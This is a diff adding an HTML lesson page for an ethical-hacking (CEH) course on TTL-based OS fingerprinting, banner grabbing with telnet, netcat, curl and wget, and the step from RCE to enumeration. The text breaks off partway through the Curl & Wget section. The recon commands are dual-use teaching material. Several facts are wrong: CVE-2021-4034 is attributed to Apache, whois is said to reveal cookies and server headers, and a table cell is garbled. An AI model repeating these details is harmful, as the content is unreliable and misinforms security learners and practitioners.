@@ -1,0 +1,1699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enumeration & Banner Grabbing - CEH Professional Course</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <h1>🔍 Enumeration & Banner Grabbing</h1>
+        <p>Professional Educational Platform • Network Reconnaissance & Service Identification</p>
+    </header>
+    
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title">📚 Core Concepts</div>
+                <a class="sidebar-link active" onclick="switchTab('overview')">Overview</a>
+                <a class="sidebar-link" onclick="switchTab('os-fingerprinting')">OS Fingerprinting</a>
+                <a class="sidebar-link" onclick="switchTab('banner-grabbing')">Banner Grabbing</a>
+                <a class="sidebar-link" onclick="switchTab('enumeration-intro')">Enumeration Intro</a>
+            </div>
+            
+            <div class="sidebar-section">
+                <div class="sidebar-title">🛠️ Tools & Techniques</div>
+                <a class="sidebar-link" onclick="switchTab('banner-tools')">Banner Tools</a>
+                <a class="sidebar-link" onclick="switchTab('curl-wget')">Curl & Wget</a>
+                <a class="sidebar-link" onclick="switchTab('nikto-dmitri')">Nikto & Dmitri</a>
+                <a class="sidebar-link" onclick="switchTab('netbios-enum')">NetBIOS Enumeration</a>
+            </div>
+            
+            <div class="sidebar-section">
+                <div class="sidebar-title">🔗 Advanced Topics</div>
+                <a class="sidebar-link" onclick="switchTab('snmp-enum')">SNMP Enumeration</a>
+                <a class="sidebar-link" onclick="switchTab('nfs-enum')">NFS Enumeration</a>
+                <a class="sidebar-link" onclick="switchTab('smtp-dns-enum')">SMTP & DNS</a>
+                <a class="sidebar-link" onclick="switchTab('smb-enum')">SMB Enumeration</a>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title">⚔️ Exploitation</div>
+                <a class="sidebar-link" onclick="switchTab('nfs-exploit')">NFS Exploitation</a>
+                <a class="sidebar-link" onclick="switchTab('rce-intro')">RCE Introduction</a>
+                <a class="sidebar-link" onclick="switchTab('attack-vectors')">Attack Vectors</a>
+                <a class="sidebar-link" onclick="switchTab('summary-4ceh')">Summary & Recap</a>
+            </div>
+        </aside>
+        
+        <!-- Main Content -->
+        <main class="content">
+            <!-- Breadcrumb -->
+            <div class="breadcrumb">
+                <span>Home</span>
+                <span>/</span>
+                <span id="breadcrumb-current">Overview</span>
+            </div>
+            
+            <!-- Overview Tab -->
+            <div id="overview" class="tab-content active">
+                <h2>🔍 Enumeration & Banner Grabbing Overview</h2>
+                <p style="font-size: 1.1em; color: var(--muted); margin-bottom: 30px;">
+                    Progress from passive scanning to active enumeration. Learn banner grabbing techniques, service-specific enumeration, and initial exploitation methods to extract detailed system information.
+                </p>
+                
+                <div class="grid-2">
+                    <div class="grid-card fade-in">
+                        <h4>📍 Progression Path</h4>
+                        <ul>
+                            <li>1_CEH: Passive footprinting</li>
+                            <li>2_CEH: DNS enumeration</li>
+                            <li>3_CEH: Network scanning</li>
+                            <li>→ 4_CEH: Active enumeration</li>
+                            <li>5_CEH+: Exploitation</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="grid-card fade-in">
+                        <h4>🎯 Four Key Stages</h4>
+                        <ul>
+                            <li>OS Fingerprinting (TTL analysis)</li>
+                            <li>Banner Grabbing (service info)</li>
+                            <li>Enumeration (detailed extraction)</li>
+                            <li>Exploitation (RCE & access)</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3>The Attack Chain</h3>
+                <div class="timeline">
+                    <div class="timeline-item fade-in">
+                        <div class="timeline-date">Stage 1: Scanning</div>
+                        <p>Identify open ports and running services</p>
+                    </div>
+                    <div class="timeline-item fade-in">
+                        <div class="timeline-date">Stage 2: OS Fingerprinting</div>
+                        <p>Determine OS through TTL analysis and port signatures</p>
+                    </div>
+                    <div class="timeline-item fade-in">
+                        <div class="timeline-date">Stage 3: Banner Grabbing</div>
+                        <p>Extract service banners and version info</p>
+                    </div>
+                    <div class="timeline-item fade-in">
+                        <div class="timeline-date">Stage 4: Enumeration</div>
+                        <p>Deep extraction of users, groups, shares, services</p>
+                    </div>
+                    <div class="timeline-item fade-in">
+                        <div class="timeline-date">Stage 5: Exploitation</div>
+                        <p>Leverage findings for RCE and unauthorized access</p>
+                    </div>
+                </div>
+
+                <h3>Learning Objectives</h3>
+                <div class="grid-2">
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Understanding Concepts</h4>
+                        <ul style="font-size: 0.95em;">
+                            <li>TTL values for OS detection</li>
+                            <li>Service identification methods</li>
+                            <li>Banner grabbing techniques</li>
+                            <li>Enumeration protocols</li>
+                            <li>Vulnerability discovery process</li>
+                        </ul>
+                    </div>
+
+                    <div class="box box-concept">
+                        <h4 style="margin-top: 0;">Practical Skills</h4>
+                        <ul style="font-size: 0.95em;">
+                            <li>Using whois, curl, wget</li>
+                            <li>Nikto web scanner</li>
+                            <li>Dmitri information tool</li>
+                            <li>NetBIOS enumeration</li>
+                            <li>SNMP/NFS exploitation</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- OS Fingerprinting Tab -->
+            <div id="os-fingerprinting" class="tab-content">
+                <h2>🖥️ OS Fingerprinting via TTL Analysis</h2>
+                
+                <div class="card fade-in">
+                    <h3>What is OS Fingerprinting?</h3>
+                    <div class="definition">
+                        <strong>OS Fingerprinting:</strong> The technique of identifying the operating system running on a remote machine by analyzing network responses, particularly TTL (Time To Live) values in ping responses and other protocol-specific behaviors.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>Why OS Fingerprinting Matters:</strong></p>
+                    <div class="box box-theory">
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li><strong>Vulnerability Targeting:</strong> Different OS have different vulnerabilities</li>
+                            <li><strong>Exploit Selection:</strong> Choose exploits matching the OS</li>
+                            <li><strong>Configuration Assumptions:</strong> Predict likely security settings</li>
+                            <li><strong>Attack Planning:</strong> Customize attack strategy per OS</li>
+                            <li><strong>Network Landscape:</strong> Understand infrastructure composition</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>TTL Values: The Key Identifier</h3>
+                    
+                    <div class="definition">
+                        <strong>TTL (Time To Live):</strong> The hop count - how many network segments (routers) a packet can traverse before being discarded. Each router decrements TTL by 1. Different OSes set different initial TTL values.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>Default TTL by Operating System:</strong></p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Operating System</th>
+                                <th>Default TTL</th>
+                                <th>Range (After Routers)</th>
+                                <th>Classification</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Linux / Unix / Android</strong></td>
+                                <td>64</td>
+                                <td>60-64</td>
+                                <td>Standard</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Windows XP - Windows 11</strong></td>
+                                <td>128</td>
+                                <td>110-128</td>
+                                <td>NTargeted Services</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Solaris / Cisco</strong></td>
+                                <td>255</td>
+                                <td>240-255</td>
+                                <td>Enterprise</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Mac OS X</strong></td>
+                                <td>64</td>
+                                <td>60-64</td>
+                                <td>Unix-based</td>
+                            </tr>
+                            <tr>
+                                <td><strong>FreeBSD</strong></td>
+                                <td>64</td>
+                                <td>60-64</td>
+                                <td>BSD Variant</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Windows Server 2003/2008</strong></td>
+                                <td>128</td>
+                                <td>110-128</td>
+                                <td>Server OS</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>How TTL Fingerprinting Works</h3>
+                    
+                    <div class="box box-concept">
+                        <h4 style="margin-top: 0;">The Process</h4>
+                        
+                        <div style="margin-top: 15px; padding: 15px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--primary); border-radius: 4px;">
+                            <p><strong>Scenario:</strong> Attacker sends ping to 192.168.1.50</p>
+                            
+                            <div style="padding: 10px; margin: 10px 0; background: rgba(0,0,0,0.2); border-radius: 3px;">
+                                <p><strong style="color: var(--accent);">Step 1: Initial TTL</strong></p>
+                                <p>Attacker's machine has operating system, sets initial TTL value</p>
+                                <p>Linux: TTL = 64 | Windows: TTL = 128</p>
+                            </div>
+
+                            <div style="padding: 10px; margin: 10px 0; background: rgba(0,0,0,0.2); border-radius: 3px;">
+                                <p><strong style="color: var(--accent);">Step 2: Router Traversal</strong></p>
+                                <p>Packet passes through routers to reach destination</p>
+                                <p>Each router decrements TTL: 64 → 63 → 62 (after 2 hops)</p>
+                            </div>
+
+                            <div style="padding: 10px; margin: 10px 0; background: rgba(0,0,0,0.2); border-radius: 3px;">
+                                <p><strong style="color: var(--secondary);">Step 3: Response TTL</strong></p>
+                                <p>Remote machine receives ping with reduced TTL</p>
+                                <p>Sends echo reply with its own initial TTL value</p>
+                            </div>
+
+                            <div style="padding: 10px; margin: 10px 0; background: rgba(0,0,0,0.2); border-radius: 3px;">
+                                <p><strong style="color: var(--secondary);">Step 4: Analysis</strong></p>
+                                <p>Attacker receives response and checks TTL value</p>
+                                <p>TTL ≈ 128? → Windows OS</p>
+                                <p>TTL ≈ 64? → Linux/Unix OS</p>
+                            </div>
+
+                            <div style="padding: 15px; background: rgba(0,212,255,0.1); border-radius: 4px; border-left: 3px solid var(--primary);">
+                                <p style="margin: 0;"><strong>Example Output:</strong></p>
+                                <code style="display: block; margin-top: 8px;">ping 192.168.1.50
+Reply from 192.168.1.50: bytes=32 time=2ms TTL=127
+→ Likely Windows (one hop from 128)</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Practical TTL Fingerprinting Examples</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">TTL = 128 (Exact)</h4>
+                            <p><strong>OS Detection:</strong> Windows</p>
+                            <p><strong>Interpretation:</strong> Local network, same subnet</p>
+                            <p><strong>Likelihood:</strong> Windows 10, Server 2019, 2022</p>
+                            <p><strong>Hops:</strong> Direct connection (0 routers)</p>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">TTL = 120-127 Range</h4>
+                            <p><strong>OS Detection:</strong> Windows</p>
+                            <p><strong>Interpretation:</strong> Few hops away (1-8 routers)</p>
+                            <p><strong>Example:</strong> 125 means 3 hops (128-3=125)</p>
+                            <p><strong>Finding:</strong> Through corporate network</p>
+                        </div>
+
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">TTL = 64 (Exact)</h4>
+                            <p><strong>OS Detection:</strong> Linux/Unix/Mac</p>
+                            <p><strong>Interpretation:</strong> Local network, same subnet</p>
+                            <p><strong>Likelihood:</strong> Ubuntu, CentOS, Debian, Fedora</p>
+                            <p><strong>Hops:</strong> Direct connection (0 routers)</p>
+                        </div>
+
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">TTL = 60-63 Range</h4>
+                            <p><strong>OS Detection:</strong> Linux/Unix/Mac</p>
+                            <p><strong>Interpretation:</strong> Few hops away (1-4 routers)</p>
+                            <p><strong>Example:</strong> 61 means 3 hops (64-3=61)</p>
+                            <p><strong>Finding:</strong> Through provider network</p>
+                        </div>
+
+                        <div class="box box-warning">
+                            <h4 style="margin-top: 0;">TTL = 255 (Exact)</h4>
+                            <p><strong>OS Detection:</strong> Cisco/Solaris/Routers</p>
+                            <p><strong>Interpretation:</strong> Enterprise equipment</p>
+                            <p><strong>Finding:</strong> Network infrastructure device</p>
+                            <p><strong>Danger:</strong> May indicate high-value target</p>
+                        </div>
+
+                        <div class="box box-warning">
+                            <h4 style="margin-top: 0;">TTL = 32</h4>
+                            <p><strong>OS Detection:</strong> Old Microsoft Devices</p>
+                            <p><strong>Interpretation:</strong> Legacy systems</p>
+                            <p><strong>Finding:</strong> Windows 95/98/ME</p>
+                            <p><strong>Risk:</strong> Very vulnerable systems</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Banner Grabbing Tab -->
+            <div id="banner-grabbing" class="tab-content">
+                <h2>📡 Banner Grabbing Fundamentals</h2>
+                
+                <div class="card fade-in">
+                    <h3>What is Banner Grabbing?</h3>
+                    <div class="definition">
+                        <strong>Banner Grabbing:</strong> The process of collecting information about a computer system or other network device by reading text returned when connecting to it. These "banners" reveal service names, versions, and sometimes build metadata.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>Why Banner Grabbing is Critical:</strong></p>
+                    <div class="box box-warning">
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li><strong>Version Identification:</strong> Exact software version = known vulnerabilities</li>
+                            <li><strong>CVE Matching:</strong> Apache 2.2.8 → specific exploits available</li>
+                            <li><strong>Exploit Databases:</strong> Quickly match vulnerability to version</li>
+                            <li><strong>Automated Attacks:</strong> Metasploit uses version info for automation</li>
+                            <li><strong>Time Efficiency:</strong> Don't waste time on unvulnerable versions</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Types of Banners</h3>
+                    
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Service</th>
+                                <th>Port</th>
+                                <th>Banner Example</th>
+                                <th>Information Revealed</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>HTTP</strong></td>
+                                <td>80</td>
+                                <td>Server: Apache/2.4.41 (Ubuntu)</td>
+                                <td>Web server, version, OS</td>
+                            </tr>
+                            <tr>
+                                <td><strong>HTTPS</strong></td>
+                                <td>443</td>
+                                <td>Server: nginx/1.18 (OpenSSL 1.1)</td>
+                                <td>SSL/TLS info, versions</td>
+                            </tr>
+                            <tr>
+                                <td><strong>SSH</strong></td>
+                                <td>22</td>
+                                <td>SSH-2.0-OpenSSH_7.4</td>
+                                <td>SSH server, version</td>
+                            </tr>
+                            <tr>
+                                <td><strong>FTP</strong></td>
+                                <td>21</td>
+                                <td>220 ProFTPD 1.3.5rc3 Server</td>
+                                <td>FTP service, version</td>
+                            </tr>
+                            <tr>
+                                <td><strong>SMTP</strong></td>
+                                <td>25</td>
+                                <td>220 mail.example.com ESMTP Postfix</td>
+                                <td>Mail server, hostname</td>
+                            </tr>
+                            <tr>
+                                <td><strong>DNS</strong></td>
+                                <td>53</td>
+                                <td>Response includes BIND version</td>
+                                <td>DNS server, version</td>
+                            </tr>
+                            <tr>
+                                <td><strong>MySQL</strong></td>
+                                <td>3306</td>
+                                <td>5.7.31-0ubuntu0.16.04.1</td>
+                                <td>Database version, OS build</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Banner Grabbing Methods</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">Telnet Method (Legacy)</h4>
+                            <code style="background: rgba(0,0,0,0.2); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+telnet target.com 80
+                            </code>
+                            <p style="margin-top: 8px; font-size: 0.9em;">Connect on port, read returned text</p>
+                        </div>
+
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">Netcat Method</h4>
+                            <code style="background: rgba(0,0,0,0.2); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+nc target.com 80
+                            </code>
+                            <p style="margin-top: 8px; font-size: 0.9em;">Network Swiss Army knife, connect and grab</p>
+                        </div>
+
+                        <div class="box box-concept">
+                            <h4 style="margin-top: 0;">Curl Method</h4>
+                            <code style="background: rgba(0,0,0,0.2); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+curl -I http://target.com
+                            </code>
+                            <p style="margin-top: 8px; font-size: 0.9em;">HTTP header inspection, shows Server header</p>
+                        </div>
+
+                        <div class="box box-concept">
+                            <h4 style="margin-top: 0;">Wget Method</h4>
+                            <code style="background: rgba(0,0,0,0.2); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+wget --server-response -O /dev/null http://target.com
+                            </code>
+                            <p style="margin-top: 8px; font-size: 0.9em;">HTTP download tool, captures headers</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Enumeration Intro Tab -->
+            <div id="enumeration-intro" class="tab-content">
+                <h2>🔎 Enumeration vs Scanning</h2>
+                
+                <div class="card fade-in">
+                    <h3>Key Difference</h3>
+                    
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>Scanning</th>
+                                <th>Enumeration</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Connection</strong></td>
+                                <td>No active connection</td>
+                                <td>Active connections to services</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Queries</strong></td>
+                                <td>Probing for responses</td>
+                                <td>Direct queries to systems</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Environment</strong></td>
+                                <td>Any network (public or private)</td>
+                                <td>ONLY on internal networks</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Information Gathered</strong></td>
+                                <td>Service names, port states</td>
+                                <td>Usernames, shares, groups, passwords</td>
+                            </tr>
+                            <tr>
+                                <td><strong>RCE Needed</strong></td>
+                                <td>No</td>
+                                <td>Yes (already compromised one device)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Detectability</strong></td>
+                                <td>Moderate</td>
+                                <td>Very detectable</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Example</strong></td>
+                                <td>NMAP port scan</td>
+                                <td>Net user enumeration over network</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Why Enumeration Requires RCE (Remote Code Execution)</h3>
+                    
+                    <div class="box box-warning">
+                        <h4 style="margin-top: 0;">The Problem</h4>
+                        <p><strong>Scenario:</strong> Attacker on public internet tries to enumerate Windows network</p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Attacker: Public Internet (not on corporate network)</li>
+                            <li>Target: Private Network 192.168.1.0/24</li>
+                            <li>Firewall: Blocks all external access</li>
+                            <li>Result: Enumeration commands won't work from outside</li>
+                        </ul>
+                    </div>
+
+                    <div class="box box-theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">The Solution</h4>
+                        <p><strong>Attack Progression:</strong></p>
+                        <ol style="margin: 10px 0 0 20px;">
+                            <li><strong>Step 1:</strong> Find vulnerability in web server (public)</li>
+                            <li><strong>Step 2:</strong> Exploit vulnerability → gain RCE</li>
+                            <li><strong>Step 3:</strong> Now running commands on internal server</li>
+                            <li><strong>Step 4:</strong> FROM THERE, enumerate the network</li>
+                            <li><strong>Step 5:</strong> Use enumeration data to find more targets</li>
+                        </ol>
+                    </div>
+
+                    <div class="box box-example" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Example: From RCE to Enumeration</h4>
+                        <ol style="margin: 10px 0 0 20px;">
+                            <li>Attacker exploits Apache vulnerability (CVE-2021-4034)</li>
+                            <li>Gets command shell on 192.168.1.50 (web server)</li>
+                            <li>Now attacker runs: <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">net view</code></li>
+                            <li>Discovers other computers: 192.168.1.88 (database), 192.168.1.75 (mail)</li>
+                            <li>Can now target these systems from within the network</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>What Enumeration Extracts</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-concept">
+                            <h4 style="margin-top: 0;">User Information</h4>
+                            <ul style="margin: 10px 0 0 20px; font-size: 0.9em;">
+                                <li>Local usernames</li>
+                                <li>Domain usernames</li>
+                                <li>Group memberships</li>
+                                <li>Last login times</li>
+                                <li>Account status (enabled/disabled)</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-concept">
+                            <h4 style="margin-top: 0;">Shared Resources</h4>
+                            <ul style="margin: 10px 0 0 20px; font-size: 0.9em;">
+                                <li>File shares</li>
+                                <li>Printer shares</li>
+                                <li>Hidden shares (admin$)</li>
+                                <li>Permissions on shares</li>
+                                <li>What's accessible</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">System Details</h4>
+                            <ul style="margin: 10px 0 0 20px; font-size: 0.9em;">
+                                <li>Computer name</li>
+                                <li>Operating system version</li>
+                                <li>Security patches installed</li>
+                                <li>Services running</li>
+                                <li>Network configuration</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">Security Settings</h4>
+                            <ul style="margin: 10px 0 0 20px; font-size: 0.9em;">
+                                <li>Password policy</li>
+                                <li>Account lockout policy</li>
+                                <li>Audit settings</li>
+                                <li>Trust relationships</li>
+                                <li>Domain configuration</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Banner Tools Tab -->
+            <div id="banner-tools" class="tab-content">
+                <h2>🛠️ Banner Grabbing Tools</h2>
+                
+                <div class="card fade-in">
+                    <h3>Universal Banner Tools</h3>
+                    
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Telnet - The Classic Method</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">telnet target.com 80</code></p>
+                        <p><strong>How it works:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Connects to open port (unencrypted)</li>
+                            <li>Displays banner immediately upon connection</li>
+                            <li>Shows service identification text</li>
+                            <li>Works on any open port</li>
+                        </ul>
+                        <p style="margin-top: 10px;"><strong>Output Example:</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 5px;">
+Connected to scanme.nmap.org.<br>
+Escape character is '^]'.<br>
+SSH-2.0-OpenSSH_6.6.1p1 Ubuntu 2ubuntu2.13
+                        </code>
+                    </div>
+
+                    <div class="box box-theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Netcat - Swiss Army Knife</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">nc target.com 80</code></p>
+                        <p><strong>Advantages:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>More reliable than telnet</li>
+                            <li>Bidirectional connection</li>
+                            <li>Works with encrypted/unencrypted</li>
+                            <li>Available on most systems</li>
+                        </ul>
+                        <p style="margin-top: 10px;"><strong>Example:</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 5px;">
+$ nc target.com 80<br>
+HTTP/1.1 200 OK<br>
+Server: Apache/2.4.41
+                        </code>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Web-Specific Banner Tools</h3>
+                    
+                    <div class="box box-concept">
+                        <h4 style="margin-top: 0;">Whois Command</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">whois http://vision-tag.com</code></p>
+                        <p><strong>What it extracts:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Public IP addresses</li>
+                            <li>Server software (Apache, Nginx, etc.)</li>
+                            <li>HTTP headers and metadata</li>
+                            <li>Cookie information</li>
+                            <li>Email addresses</li>
+                            <li>Security headers (or lack thereof)</li>
+                        </ul>
+                        <p style="margin-top: 10px;"><strong>Output Example:</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 5px; font-size: 0.85em;">
+vision-tag.com to 100<br>
+cookies: Session=laralevel<br>
+email: info@vision-tag.com<br>
+server: Apache<br>
+HTTP only (vulnerability)
+                        </code>
+                    </div>
+
+                    <div class="box box-concept" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Nikto Web Scanner</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">nikto -h target.com</code></p>
+                        <p><strong>Purpose:</strong> Open-source web application scanner</p>
+                        <p><strong>Detects:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Server software and version</li>
+                            <li>Dangerous CGI scripts</li>
+                            <li>Outdated software</li>
+                            <li>Default files/accounts</li>
+                            <li>Configuration issues</li>
+                            <li>Security misconfigurations</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Dmitri - Information Gathering Tool</h3>
+                    
+                    <div class="box box-example">
+                        <h4 style="margin-top: 0;">Dmitri (Deepmagic Information Gathering Tool)</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">dmitri target.com</code></p>
+                        
+                        <p style="margin-top: 15px;"><strong>Capabilities:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li><strong>Subdomains:</strong> Find all subdomains</li>
+                            <li><strong>Email Addresses:</strong> Extract email addresses</li>
+                            <li><strong>Whois Lookup:</strong> Domain registration info</li>
+                            <li><strong>TCP Port Scanning:</strong> Identify open ports</li>
+                            <li><strong>Uptime Information:</strong> Historical data</li>
+                            <li><strong>DNS Record Lookup:</strong> MX, NS, A records</li>
+                            <li><strong>Daemon Versions:</strong> Service identification</li>
+                        </ul>
+
+                        <p style="margin-top: 15px;"><strong>Information Extracted:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Public IP addresses</li>
+                            <li>Open port information</li>
+                            <li>FTP/SSH/SMTP versions</li>
+                            <li>Domain information</li>
+                            <li>Potential subdomains</li>
+                            <li>Network configuration</li>
+                        </ul>
+
+                        <p style="margin-top: 15px;"><strong>Output Example:</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 5px; font-size: 0.85em;">
+IP address information: 93.184.216.34<br>
+Port 21: FTP open<br>
+Port 22: SSH OpenSSH_7.4 open<br>
+Port 25: SMTP open<br>
+Port 53: DNS open<br>
+Port 443: HTTPS open
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Curl and Wget Tab -->
+            <div id="curl-wget" class="tab-content">
+                <h2>📥 Curl & Wget for Banner Grabbing</h2>
+                
+                <div class="card fade-in">
+                    <h3>Curl - Command Line URL Tool</h3>
+                    
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Basic Curl Banner Grabbing</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">curl http://target.com</code></p>
+                        
+                        <p style="margin-top: 15px;"><strong>Common Curl Options:</strong></p>
+                        <table style="margin-top: 10px; width: 100%; font-size: 0.9em;">
+                            <tr>
+                                <td><code>-I</code></td>
+                                <td>Headers only (no body)</td>
+                            </tr>
+                            <tr>
+                                <td><code>-i</code></td>
+                                <td>Include all headers</td>
+                            </tr>
+                            <tr>
+                                <td><code>-v</code></td>
+                                <td>Verbose (see all details)</td>
+                            </tr>
+                            <tr>
+                                <td><code>-A</code></td>
+                                <td>Spoof User-Agent</td>
+                            </tr>
+                            <tr>
+                                <td><code>-H</code></td>
+                                <td>Add custom header</td>
+                            </tr>
+                        </table>
+
+                        <p style="margin-top: 15px;"><strong>Practical Examples:</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+# Get only headers<br>
+curl -I http://example.com<br>
+<br>
+# Verbose output<br>
+curl -v http://example.com<br>
+<br>
+# Output:<br>
+Server: Apache/2.4.41 (Ubuntu)<br>
+X-Powered-By: PHP/7.4.3
+                        </code>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Wget - HTTP Download Tool</h3>
+                    
+                    <div class="box box-concept">
+                        <h4 style="margin-top: 0;">Banner Grabbing with Wget</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">wget --server-response -O /dev/null http://target.com</code></p>
+                        
+                        <p style="margin-top: 15px;"><strong>What --server-response Does:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Displays HTTP headers sent by server</li>
+                            <li>Shows response codes (200, 404, etc.)</li>
+                            <li>Reveals server software version</li>
+                            <li>Shows content-type information</li>
+                            <li>-O /dev/null prevents file download</li>
+                        </ul>
+
+                        <p style="margin-top: 15px;"><strong>Wget vs Curl Comparison:</strong></p>
+                        <table style="margin-top: 10px; width: 100%; font-size: 0.9em;">
+                            <tr>
+                                <td><strong>Wget</strong></td>
+                                <td>Download files, simple headers, non-interactive</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Curl</strong></td>
+                                <td>More protocols, detailed headers, interactive</td>
+                            </tr>
+                        </table>
+
+                        <p style="margin-top: 15px;"><strong>Output Example:</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+HTTP request sent, awaiting response...<br>
+HTTP/1.1 200 OK<br>
+Date: Monday 24-Mar-2026 17:56<br>
+Server: Apache/2.4.41<br>
+Content-Type: text/html<br>
+Content-Length: 15234
+                        </code>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Captured Information from Banners</h3>
+                    
+                    <div class="box box-warning">
+                        <h4 style="margin-top: 0;">What Apache Banner Leak Means</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; margin-bottom: 8px;">
+Server: Apache/2.4.41 (Ubuntu)<br>
+X-Powered-By: PHP/7.4.3
+                        </code>
+                        <p><strong>Attacker Now Knows:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>Web server is Apache version 2.4.41</li>
